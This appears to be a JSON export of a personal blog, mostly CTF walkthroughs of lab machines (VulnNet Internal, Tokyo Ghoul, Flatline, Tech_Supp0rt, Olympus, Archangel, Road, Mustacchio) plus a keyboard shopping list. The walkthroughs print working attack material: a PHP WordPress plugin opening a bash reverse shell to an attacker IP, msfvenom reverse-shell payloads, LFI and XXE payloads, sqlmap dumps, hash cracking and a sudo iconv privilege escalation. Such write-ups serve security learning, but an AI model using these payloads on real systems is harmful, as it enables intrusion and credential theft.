{"meta":{"title":"Peanutstick","subtitle":"","description":"","author":"Peanutstick","url":"https://peanutstick.github.io","root":"/"},"pages":[],"posts":[{"title":"CTF VulnNet Internal","slug":"CTF VulnNet Internal","date":"2023-04-25T15:21:16.510Z","updated":"2023-04-25T15:25:05.111Z","comments":true,"path":"/post/CTF VulnNet Internal.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20VulnNet%20Internal.html","excerpt":"","text":"nmapnmap -p- -T5 -sV -vvv 10.10.210.193 Output: PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 111/tcp open rpcbind syn-ack 2-4 (RPC #100000) 139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 873/tcp open rsync syn-ack (protocol version 31) 2049/tcp open nfs_acl syn-ack 3 (RPC #100227) 6379/tcp open redis syn-ack Redis key-value store 9090/tcp filtered zeus-admin no-response 44305/tcp open nlockmgr syn-ack 1-4 (RPC #100021) 50597/tcp open mountd syn-ack 1-3 (RPC #100005) 55125/tcp open mountd syn-ack 1-3 (RPC #100005) 58261/tcp open mountd syn-ack 1-3 (RPC #100005) Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel SMBsmbclient //10.10.210.193/shares -U \"guest\" NFSsudo pacman -S nfs-utils sudo mount -t nfs 10.10.210.193:/opt/conf /home/peanutstick/Documents/CTF/THM/vulnet_internal/mount The config files are interesting, we have the service redis.Let’s grab the password. B65Hx562F@ggAZ@F Redishttps://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis nc -vn 10.10.210.193 6379 AUTH B65Hx562F@ggAZ@F SELECT 0 KEYS * GET \"internal flag\" Get “authlist”: LRANGE \"authlist\" 0 -1 Decode the hash: echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== |base64 -d Output: Authorization for rsync:&#x2F;&#x2F;rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v RsyncList the files:rsync -av --list-only rsync://10.10.210.193 Copy files.rsync -av rsync://rsync-connect@10.10.210.193/files ./files We have the flag, tree don’t list the uden flags. https://medium.com/r3d-buck3t/attack-insecure-rsync-service-928951af34edThere is a .ssh, we can upload a authorized_keys to conncet via ssh. ssh-keygen -t rsa Then upload it: rsync authorized_keys rsync://rsync-connect@10.10.210.193/files/sys-internal/.ssh Connect to ssh: ssh -i A_rsa sys-internal@10.10.210.193 SSHlse.sh Then: wget http://10.8.50.167:8000/lse.sh chmod +x * ./lse.sh yeah but I don’t have my password 8111Port forwardinghttps://hideandsec.sh/books/cheatsheets-82c/page/pivoting ss The port 8111 is open: ssh -i A_rsa sys-internal@10.10.210.193 -D 8111:127.0.0.1:8111 -N http://127.0.0.1:8111/login.htmlClick on “as a Super user” then: cd /TeamCity/logs grep --color=auto -rnw '.' -ie \"token\" --color=always 2> /dev/null Output: .&#x2F;catalina.out:56:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server) .&#x2F;catalina.out:57:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server) .&#x2F;catalina.out:1402:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server) .&#x2F;catalina.out:1457:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server) .&#x2F;catalina.out:1526:[TeamCity] Super user authentication token: 6152940187709854289 (use empty username with the token as the password to access the server) .&#x2F;catalina.out:1583:[TeamCity] Super user authentication token: 6152940187709854289 (use empty username with the token as the password to access the server) once the command is in the build step, start the listener then click on run.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Pivot","slug":"Pivot","permalink":"https://peanutstick.github.io/tags/Pivot/"}]},{"title":"CTF Tokyo Ghoul","slug":"CTF Tokyo Ghoul","date":"2023-04-23T15:42:00.000Z","updated":"2023-04-25T15:23:27.491Z","comments":true,"path":"/post/CTF Tokyo Ghoul.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Tokyo%20Ghoul.html","excerpt":"","text":"nmapnmap -sV -p- -T4 10.10.183.217 -vvv Output: PORT STATE SERVICE REASON VERSION 21&#x2F;tcp open ftp syn-ack vsftpd 3.0.3 22&#x2F;tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel HTTPNothing with gobuster.There if few notes that tell us to browse the FTP FTPwget -r ftp://anonymous@10.10.183.217 Users ? Rize San Kaneki ReversOne ELF executable:Strings on it:Users ? kamishiro Kaneki rabin2 -z is for revers.I’m using dogbolt: https://dogbolt.org SteganoOne image:With steghide I can see an another file, I’m using the password You_found_1t:https://book.hacktricks.xyz/crypto-and-stego/stego-tricks steghide info rize_and_kaneki.jpg Extract it: steghide extract -sf rize_and_kaneki.jpg --passphrase You_found_1t decode CyberChefhttps://gchq.github.io/ dcode.fr base64echo ZDFyM2M3MHJ5X2NlbnRlcg== |base64 -d Output:d1r3c70ry_center Web enumerationI need to scan this directory: gobuster dir -u http://10.10.183.217/d1r3c70ry_center/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html 10.10.183.217/d1r3c70ry_center/claim/This box keep crashing… gobuster dir -u http://10.10.183.217/d1r3c70ry_center/claim -w /usr/share/wordlists/dirb/common.txt -x txt,php,html 10.10.183.217/d1r3c70ry_center/claim/contact-us.html10.10.183.217/d1r3c70ry_center/claim/about-us.html we have an email:&#115;&#x75;&#112;&#x65;&#114;&#115;&#x65;&#99;&#x75;&#114;&#101;&#99;&#x6f;&#x6d;&#112;&#x61;&#x6e;&#x79;&#64;&#x73;&#117;&#112;&#101;&#x72;&#115;&#101;&#99;&#x75;&#114;&#101;&#99;&#111;&#109;&#112;&#x61;&#x6e;&#121;&#46;&#x63;&#x6f;we add it to /etc/hosts LFIMain page: http://10.10.183.217/d1r3c70ry_center/claim/index.php?view=flower.gif http://10.10.183.217/d1r3c70ry_center/claim/index.php?view=../../../../../etc/passwd I need to bypass the waf.php://filter/convert.base64-encode/resource=../../../../../etc/passwd https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd We have the user and the hash.kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bashCrack it: john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt pass.txt kamishiropassword123 rootwe can use tis script at root I’m gonna spawn a revershell.didn’t had the time to save, the machine had a crash, again.I realy dislike this CTF, literaly unplayable, I don’t enven know where are the other flags. after 3 crash I had no other choises.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Flatline","slug":"CTF Flatline","date":"2023-04-21T11:42:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/CTF Flatline.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Flatline.html","excerpt":"","text":"nmapnmap -sV -p- -Pn -T4 flatline.thm Port 33893389/tcp open ms-wbt-server Microsoft Terminal Services CertificateI’m searching on google but there is nothing interesting.https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp Port 80218021/tcp open freeswitch-event FreeSWITCH mod_event_socketGoogle:https://www.exploit-db.com/exploits/47799 The exploit give nothing but it he say Authenticated. SI decided to execute a revershell.https://www.revshells.com/With the PowerShell #3 (Base64) First flagC:\\Users\\Nekrotic\\Desktop OpenclinicInteresting https://www.exploit-db.com/exploits/50448 create the malicious exe filemsfvenom -p windows/shell_reverse_tcp LHOST=10.8.50.167 LPORT=4242 -f exe > mysqld_evil.exe Download itInvoke-WebRequest -Uri \"http://10.8.50.167:8000/mysqld_evil.exe\" -OutFile \"mysqld_evil.exe\" Rename itRename-Item mysqld.exe mysqld.exe.old Rename-Item mysqld_evil.exe mysqld.exe RebootListen first then reboot.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://peanutstick.github.io/tags/Windows/"}]},{"title":"CTF Tech_Supp0rt 1","slug":"CTF Tech_Supp0rt 1","date":"2023-04-20T01:46:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/CTF Tech_Supp0rt 1.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Tech_Supp0rt%201.html","excerpt":"","text":"Rustscanrustscan -a 10.10.75.149 Output: 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 139&#x2F;tcp open netbios-ssn syn-ack 445&#x2F;tcp open microsoft-ds syn-ack gobustergobuster dir -u http://10.10.75.149/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html Output: &#x2F;phpinfo.php (Status: 200) [Size: 94928] &#x2F;phpinfo.php (Status: 200) [Size: 94928] &#x2F;server-status (Status: 403) [Size: 277] &#x2F;test (Status: 301) [Size: 311] [--&gt; http:&#x2F;&#x2F;10.10.75.149&#x2F;test&#x2F;] &#x2F;wordpress (Status: 301) [Size: 316] [--&gt; http:&#x2F;&#x2F;10.10.75.149&#x2F;wordpress&#x2F;] We have 2 website: wordpress scam page wpscanwpscan --url http://10.10.75.149/wordpress/ --enumerate u Output [+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12). ... [+] WordPress theme in use: teczilla [!] The version is out of date, the latest version is 1.1.4 ... [+] support ... http:&#x2F;&#x2F;10.10.75.149&#x2F;wordpress&#x2F;index.php&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 ... smbcrackmapexec smb 10.10.75.149 -u support -p /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Output: support:123456 smbmap -H 10.10.75.149 -R -u \"support\" -p \"123456\" Output: [+] IP: 10.10.75.149:445 Name: 10.10.75.149 Status: Guest session Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers websvr READ ONLY .\\websvr\\\\* dr--r--r-- 0 Sat May 29 09:17:38 2021 . dr--r--r-- 0 Sat May 29 09:03:47 2021 .. fr--r--r-- 273 Sat May 29 09:17:38 2021 enter.txt IPC$ NO ACCESS IPC Service (TechSupport server (Samba, Ubuntu)) smbclient //10.10.75.149/websvr -U \"support\" Password for [WORKGROUP\\support]: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Sat May 29 09:17:38 2021 .. D 0 Sat May 29 09:03:47 2021 enter.txt N 273 Sat May 29 09:17:38 2021 8460484 blocks of size 1024. 5695980 blocks available smb: \\> cat enter.txt cat: command not found smb: \\> more enter.txt getting file \\enter.txt of size 273 as /tmp/smbmore.KPey6E (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec) GOALS &#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1)Make fake popup and host it online on Digital Ocean server 2)Fix subrion site, &#x2F;subrion doesn&#39;t work, edit from panel 3)Edit wordpress website IMP &#x3D;&#x3D;&#x3D; Subrion creds |-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula] Wordpress creds |-&gt; This hash is cooked: 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk Scam2021 Let’s see what is subrion:https://www.exploit-db.com/exploits/49876 shellparser.add_option('-u', '--url', action=\"store\", dest=\"url\", help=\"Base target uri http://target/panel\") This revershell don’t smell good… cat /etc/passwd scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash cat /var/www/*/w*/*config* Wordpress creds:user: supportpassword: ImAScammerLOL!123! wordpress revershellwp_plugin_rv.php &lt;?php /** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http://peanutstick.githubio.com */ exec(\"/bin/bash -c 'bash -i >&amp; /dev/tcp/10.8.50.167/4949 0>&amp;1'\"); ?> Then listen: nc -lnvp 4949 Upload it: sshssh scamsite@10.10.75.149 With the last password. sudo -l ... (ALL) NOPASSWD: /usr/bin/iconv https://gtfobins.github.io/gtfobins/iconv/ privescecho \"scamsite ALL=(ALL:ALL) ALL\" | sudo iconv -f 8859_1 -t 8859_1 -o \"$LFILE\" sudo su","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"}]},{"title":"CTF Olympus","slug":"CTF Olympus","date":"2023-04-19T01:46:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/CTF Olympus.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Olympus.html","excerpt":"","text":"rustscanrustscan -a 10.10.79.244 Output PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack /etc/hosts10.10.79.244 olympus.thm Gobustergobuster dir -u http://olympus.thm/. -w /usr/share/wordlists/dirb/common.txt -x txt,php,html Victor CMS Gobustergobuster dir -u http://olympus.thm/~webmaster/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html sqlmaphttps://www.exploit-db.com/exploits/48734 sqlmap -u \"[http://olympus.thm/~webmaster/search.php](http://olympus.thm/~webmaster/search.php \"http://olympus.thm/~webmaster/search.php\")\" --data=\"search=1337*&amp;submit=\" --dbs --random-agent -v 3 sqlmap -u \"[http://olympus.thm/~webmaster/search.php](http://olympus.thm/~webmaster/search.php \"http://olympus.thm/~webmaster/search.php\")\" --data=\"search=1337*&amp;submit=\" -D olympus --tables --random-agent -v 3 sqlmap -u \"[http://olympus.thm/~webmaster/search.php](http://olympus.thm/~webmaster/search.php \"http://olympus.thm/~webmaster/search.php\")\" --data=\"search=1337*&amp;submit=\" -D olympus -T flag --dump --random-agent -v 3 We have the flag, now let’s grab the users. sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*&amp;submit=\" -D olympus -T users --dump --random-agent -v 3 $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp&#x2F;r0HMtaj6rT4lC prometheus@olympus.thm root@chat.olympus.thm zeus@chat.olympus.thm Add chat.olympus.thm to /etc/hosts. Let’s see the chat: sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*&amp;submit=\" -D olympus -T chats --dump --random-agent -v 3 The file:47c3210d51761686f3af40a875eeaaea.txt Crack the hashhash: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp&#x2F;r0HMtaj6rT4lC john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash user: prometheuspassword: summertime chat.olympus.thmUser the passwords. Let’s find the file of prometeus in /upload ReversShellhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php Listen with nc and prepare the php file.Upload it then search the name of the file with sqlmap. sqlmap -u \"http://olympus.thm/~webmaster/search.php\" --data=\"search=1337*&amp;submit=\" -D olympus -T chats --dump --random-agent -v 3 --flush-session File: c203512147848451a628bc69a6db446b.php Browse here:http://chat.olympus.thm/uploads/c203512147848451a628bc69a6db446b.php Then: EnumLSE.SH /usr/bin/cputilshttps://exploit-notes.hdks.org/exploit/linux/privilege-escalation/#cputils www-data@olympus:/home/zeus$ /usr/bin/cputils ____ ____ _ _ _ / ___| _ \\ _ _| |_(_) |___ | | | |_) | | | | __| | / __| | |___| __/| |_| | |_| | \\__ \\ \\____|_| \\__,_|\\__|_|_|___/ Enter the Name of Source File: /home/zeus/.ssh/id_rsa Enter the Name of Target File: /tmp/id_rsa File copied successfully. Now we crack the id_rsa file. ssh2john id_rsa > hash john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash Password: snowflake Home SSH Browse to /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc secured 0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php http://10.10.79.244/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php grep --color=auto -rnw '/etc/' -ie \"flag&#123;\" --color=always 2> /dev/null curl http://127.0.0.1/index/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.8.50.167&amp;port=4444 NOt working SUIDExecute this.I’m root Flag bonusgrep --color=auto -rnw '/etc/' -ie \"flag&#123;\" --color=always 2> /dev/null","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Archangel","slug":"CTF Archangel","date":"2023-04-17T00:15:00.000Z","updated":"2023-04-25T15:22:38.416Z","comments":true,"path":"/post/CTF Archangel.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Archangel.html","excerpt":"","text":"rustscanrustscan -a 10.10.96.213 Output: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack gobustergobuster dir -u http://10.10.96.213/. -x html,php,js,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Output WebsiteWe have the domain name:mafialive.thmAdd it to /etc/hosts LFIhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php echo CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3d y9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== |base64 -d Decode: &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;INCLUDE&lt;&#x2F;title&gt; &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt; &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt; &lt;?php &#x2F;&#x2F;FLAG: thm&#123;explo1t1ng_lf1&#125; function containsStr($str, $substr) &#123; return strpos($str, $substr) !&#x3D;&#x3D; false; &#125; if(isset($_GET[&quot;view&quot;]))&#123; if(!containsStr($_GET[&#39;view&#39;], &#39;..&#x2F;..&#39;) &amp;&amp; containsStr($_GET[&#39;view&#39;], &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#39;)) &#123; include $_GET[&#39;view&#39;]; &#125;else&#123; echo &#39;Sorry, Thats not allowed&#39;; &#125; &#125; ?&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"LFI","slug":"LFI","permalink":"https://peanutstick.github.io/tags/LFI/"}]},{"title":"Keyboars","slug":"Keyboards","date":"2023-04-16T00:15:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/Keyboards.html","link":"","permalink":"https://peanutstick.github.io/post/Keyboards.html","excerpt":"","text":"Websites https://novelkeys.com https://kbdfans.com/ https://mykeyboard.eu https://salvun.com https://www.eloquentclicks.com/ https://keygem.com/ Amazon https://www.amazon.fr/GM610-suppl%C3%A9mentaires-r%C3%A9tro%C3%A9clair%C3%A9-programmables-Interrupteur/dp/B091T1ZYKX/ref=sr_1_1_sspa?__mk_fr_FR=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;crid=1I6OK1EBE2AL&amp;keywords=newmen&amp;qid=1681834100&amp;sprefix=newmen%2Caps%2C73&amp;sr=8-1-spons&amp;sp_csd=d2lkZ2V0TmFtZT1zcF9hdGY&amp;th=1 https://www.amazon.fr/Newmen-m%C3%A9canique-GM840-programmable-interrupteur/dp/B0BJ6NT72L/ref=sr_1_3?__mk_fr_FR=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;crid=1I6OK1EBE2AL&amp;keywords=newmen&amp;qid=1681834121&amp;sprefix=newmen%2Caps%2C73&amp;sr=8-3&amp;th=1 https://www.amazon.fr/dp/B0BM4JL782/ref=sspa_dk_detail_1?pd_rd_i=B0BM4JL782&amp;pd_rd_w=ytiT3&amp;content-id=amzn1.sym.a30983a5-b2e2-49b6-b674-0e622b88d06d&amp;pf_rd_p=a30983a5-b2e2-49b6-b674-0e622b88d06d&amp;pf_rd_r=E6P0NYBVJD52WH2GH2HR&amp;pd_rd_wg=4J0VX&amp;pd_rd_r=9cc8dfc1-fdfc-4ca2-943c-945c82c66705&amp;s=computers&amp;sp_csd=d2lkZ2V0TmFtZT1zcF9kZXRhaWw&amp;th=1 https://www.amazon.fr/dp/B0BM4JL782/ref=sspa_dk_detail_1?pd_rd_i=B0BM4JL782&amp;pd_rd_w=ytiT3&amp;content-id=amzn1.sym.a30983a5-b2e2-49b6-b674-0e622b88d06d&amp;pf_rd_p=a30983a5-b2e2-49b6-b674-0e622b88d06d&amp;pf_rd_r=E6P0NYBVJD52WH2GH2HR&amp;pd_rd_wg=4J0VX&amp;pd_rd_r=9cc8dfc1-fdfc-4ca2-943c-945c82c66705&amp;s=computers&amp;sp_csd=d2lkZ2V0TmFtZT1zcF9kZXRhaWw&amp;th=1 Aliexpress: https://ymdk.aliexpress.com/store/429151?spm=2114.search0204.3.5.50bc615aYRi0BS https://fr.aliexpress.com/store/3558035?spm=2114.search0204.3.5.2cc2615aP3BXDq https://kbdfans.aliexpress.com/store/2230037?spm=2114.search0204.3.5.4535615aaIRJUr https://cooljazz.aliexpress.com/store/1806079?spm=2114.search0204.3.5.502f615aOzd234 https://kprepublic.aliexpress.com/store/3034003?spm=a2g0s.13010208.99999999.256.652d3c00EyK0fX What do I need ? Keycaps PCB Plate Case Switch Linéaire = GamingTactile = écrire https://www.amazon.fr/Clavier-M%C3%A9canique-Majestouch-Tenkeyless-International/dp/B007VAFWM8#customerReviews https://www.realforcekeyboards.com/fr/","categories":[],"tags":[]},{"title":"CTF Road","slug":"CTF Road","date":"2023-04-15T00:15:00.000Z","updated":"2023-04-25T15:22:38.419Z","comments":true,"path":"/post/CTF Road.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Road.html","excerpt":"","text":"Rustscanrustscan -a 10.10.156.100 Output: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack Port 80We found the domain name:I have to add it to /etc/hostsskycoursiers.thm Track OrderWhen I click on search it’s doing this request: http:&#x2F;&#x2F;10.10.156.100&#x2F;v2&#x2F;admin&#x2F;track_orders?awb&#x3D;sdfsdf+sdf+sdf&amp;srchorder&#x3D; But: sqliI just had to google awb= to find this:https://www.exploit-db.com/exploits/41113We just need to exploit it.It won’t work on this page because of the 404 error.Let’s create an account an login. Inside the pannel http://skycouriers.thm/v2/ResetUser.php With burpsuit: Maybe I can also change the email adress to change the admin passwordadmin@sky.thm It’s working, I’m logged as admin. I can change my profile picture now.Let’s upload php file with a revershell from pentest monkey. I change the value in burp directly: This is where the image is stored./v2/profileimages/revs.php I listen nc -nlvp 4949 the open it:http://skycouriers.thm/v2/profileimages/revs.php Shell Hint for later.sudo_as_admin_successful form webdeveloper RootI’m tired, my head hurt, I need to drink more water…","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Mustacchio","slug":"Mustacchio","date":"2023-04-14T00:15:00.000Z","updated":"2023-04-25T15:21:16.510Z","comments":true,"path":"/post/Mustacchio.html","link":"","permalink":"https://peanutstick.github.io/post/Mustacchio.html","excerpt":"","text":"Rustscanrustscan -a 10.10.132.178 Oµutput: PORT STATE SERVICE REASON 22&#x2F;tcp open ssh syn-ack 80&#x2F;tcp open http syn-ack 8765&#x2F;tcp open ultraseek-http syn-ack Port 8765 Port 80directory listing Dowload user.bak ➜ Mustacchio strings users.bak SQLite format 3 tableusersusers CREATE TABLE users(username text NOT NULL, password text NOT NULL) ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b adminbulldog19 Admin pannelhttp://10.10.132.178:8765/home.php We have 2 hints: For the first one it’s showing how to post a comment in xml: The second telling us to use the SSH key in the home directory of barry. XML payloadhttps://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing Let’s modify this code to make it work. &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY > &lt;!ENTITY ent SYSTEM \"file:///home/barry/.ssh/id_rsa\"> ]> &lt;comment> &lt;name>dddd&lt;/name> &lt;author>sdf&lt;/author> &lt;com>&amp;ent;&lt;/com> &lt;/comment> We have the private key. -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J&#x2F;b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G&#x2F;bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim&#x2F;7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1&#x2F;alUUvI&#x2F;jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw&#x2F;1gOdCj3Byc1LJ6mRWXfD3HSmWcc&#x2F;8bHfdvVSgQ ul7A8ROlzvri7&#x2F;WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE&#x2F;u3r54vZzL0KHgXtapzb4gDl&#x2F;yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO&#x2F;ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k&#x2F;exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE&#x2F;qELpRKZ4&#x2F;k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS&#x2F;vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2&#x2F;G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G&#x2F;hQ6K6yPDO7GDh7BZuMgpND&#x2F;LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs 